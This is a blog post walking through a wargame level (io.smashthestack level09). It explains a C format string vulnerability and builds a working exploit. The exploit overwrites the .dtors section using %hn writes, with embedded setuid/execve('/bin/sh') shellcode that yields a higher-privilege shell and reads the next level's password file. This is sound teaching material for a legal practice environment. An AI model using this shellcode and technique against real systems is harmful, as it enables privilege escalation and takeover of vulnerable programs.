---
author: alvaro
comments: true
layout: post
title: Format Strings - Level09 Smash the Stack
categories:
- Archive
tags:
- security
---

The topic for this entry is about format string vulnerability. The vulnerability appears when we use functions as `printf` and so on wrongly.

```C
printf("%s", buf);  //Good
printf(buf); // wrong - What would happen if buf is "%x%x%x"?
```

When we call the latest printf call we are going to read from the stack. The layout would be the following

```
     Top of the Stack
-------------------------
|       Address of buf  |
-------------------------
|       Value of %x     |
-------------------------
|       Value of %x     |
-------------------------
|       Value of %x     |
-------------------------
|        ....           |
-------------------------
  Bottom of the Stack

```

The fun of this is that you can read, write on whatever direction you want. I am not going to write about how to do it since other have written before about [this](http://inst.eecs.berkeley.edu/~cs161/sp08/Notes/formatstring-1.2.pdf).

The code to exploit is the level09 from [io.smashthestack.org](http://io.smashthestack.org).


```C
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
	int  pad = 0xbabe;
	char buf[1024];
	strncpy(buf, argv[1], sizeof(buf) - 1);

	printf(buf);

	return 0;
}
```

```
level9@io:/levels$ ./level09 AAAA%x%x%x%x
AAAAbffffe343ff160d7c41414141
level9@io:/levels$ ./level09 AAAA4%4\$x
AAAA441414141
```

The idea is instead of `AAAA` that does nothing, write an interesting direction using `%n` to alter the normal execution of our program. There are different paths to follow to exploit this little code but I am going to use `.dtors` section. For those that don't know about `.dtors` is a section that all binaries on linux compiled with `gcc` have it. This section has an array of functions that will be called when main function exits.

```
level9@io:/levels$ nm level09
....
080494d4 d __DTOR_END__
080494d0 d __DTOR_LIST__
080484c4 r __FRAME_END__
....

level9@io:/levels$ objdump -h level09

level09:     file format elf32-i386

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
...

 13 .rodata       00000008  080484bc  080484bc  000004bc  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
 14 .eh_frame     00000004  080484c4  080484c4  000004c4  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
 15 .ctors        00000008  080494c8  080494c8  000004c8  2**2
                  CONTENTS, ALLOC, LOAD, DATA
 16 .dtors        00000008  080494d0  080494d0  000004d0  2**2
                  CONTENTS, ALLOC, LOAD, DATA
....
 ```

 We can see that the section .dtors starts in `0x080494d0`.

 ```
 level9@io:/levels$ objdump -s -j .dtors level09

level09:     file format elf32-i386

Contents of section .dtors:
 80494d0 ffffffff 00000000                    ........
 ```

How we have said before the `.dtors` section is an array of functions. This array always starts with `0xffffffff` and ends with the NULL address `0x00000000`. It's easy to deduce that level09 does not have any destructor. But that is not a reason to give up since this section is writable we are going to be able to write our own destructor :).

The idea is write in `.dtors` with the goal of redirect the flow of the execution to the code that we will write in argv[1]. The first task that we must accomplish is to know the address of argv[1].

```bash
level9@io:/levels$ for ((i = 250; i < 330; i++)); do echo -n "$i: " && ./level09 "%$i\$s" && echo -n $'\n' ; done

294: �É�
295: ,�
296: Segmentation fault
297: 1�^����PTRh
298: (null)
299: ������������U���=Е
300: U���(
301: Segmentation fault
302: 8���B���
303: U��WVS�O
304: U��]Ít&
305: U��WV1�S辊
306:���
307:
308: Segmentation fault
309: ./level09
310: %310$s
311: (null)
312: TERM=xterm-256color
313: SHELL=/bin/bash
314: SSH_CLIENT=88.22.21.50 50860 22
315: OLDPWD=/tmp
316: SSH_TTY=/dev/pts/5
317: USER=level9
318: MAIL=/var/mail/level9
319: PATH=/usr/local/radare/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
320: PWD=/levels
321: LANG=en_GB.UTF-8
322: SHLVL=1
323: HOME=/home/level9
324: LANGUAGE=en_GB:en
325: LOGNAME=level9
326: SSH_CONNECTION=88.22.21.50 50860 10.16.0.102 22
327: LC_CTYPE=es_ES.UTF-8
328: _=./level09
329: (null)

level9@io:/levels$ ./level09 %310\$x
bffffe42
```

Basically we have walked through the stack to read everything from it to extract where resides argv[1]. Using direct parameter access we know that argv[1] is in 310th position and around `0xbffffe42`.
The latest direction will vary regarding how many data we write. As much data we write in argv[1] the lower the address will be.

Using the short write we are able to write two bytes so we are going to need two directions to write in it followed by the payload.

```
\xd6\x94\x04\x08\xd4\x94\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
```

`\xd6\x94\x04\x08` is to write `bfff` and in `\xd4\x94\x04\x08` to write the lower bytes of argv[1]'s address. We should know how much characters we need before to use `%n` to write the desire number. The payload has a length of `0x38`.

```
level9@io:/levels$ gdb -q
(gdb) p 0xbfff - 0x38
$1 = 49095
(gdb) p 0xfe42 - 0xbfff
$2 = 15939
```

We are going to need 49095 more characters before to use `%n` to write `0xbfff` in `0x080494d6` and about 15939 to write `fe42` in `0x080494d4` although that will not be the exact value we will need to write. All this can be accomplished using the width specifier.

```
./level09 $(printf "\xd6\x94\x04\x08\xd4\x94\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80")%49095x%4\$hn

```

This would be the first part of our payload. The problem is that we don't know where argv[1] is in the memory since the array has grown. But we can deduce it using format string.

```
./level09 $(printf "\xd6\x94\x04\x08\xd4\x94\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80")%49095x%4\$hx%15939x%310\$hx

.....
3fffdf6
```

It's means that in `0xbffffdf6` is our argv[1].

```
level9@io:/levels$ gdb -q
(gdb) p 0xfdf6 - 0xbfff
$1 = 15863
```

The problem is that if we write `fdf6` the flow of the program will go at the beginning of argv[1] but the initial part are the directions of `.dtors`. The direction to write would be around `0xbffffdfa` where our payload really starts and it begins with a nop slide to augment our likelihood of success.

```
(gdb) p 0xfdfa - 0xbfff
$1 = 15867
```

And there it is, we have everything to exploit the vulnerability.

```


./level09 $(printf "\xd6\x94\x04\x08\xd4\x94\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80")%49095x%4\$hn%15867x%5\$hn

sh-4.2$ whoami
level10
sh-4.2$ cat /home/level10/.pass
Os**********
```


{% include twitter_plug.html %}
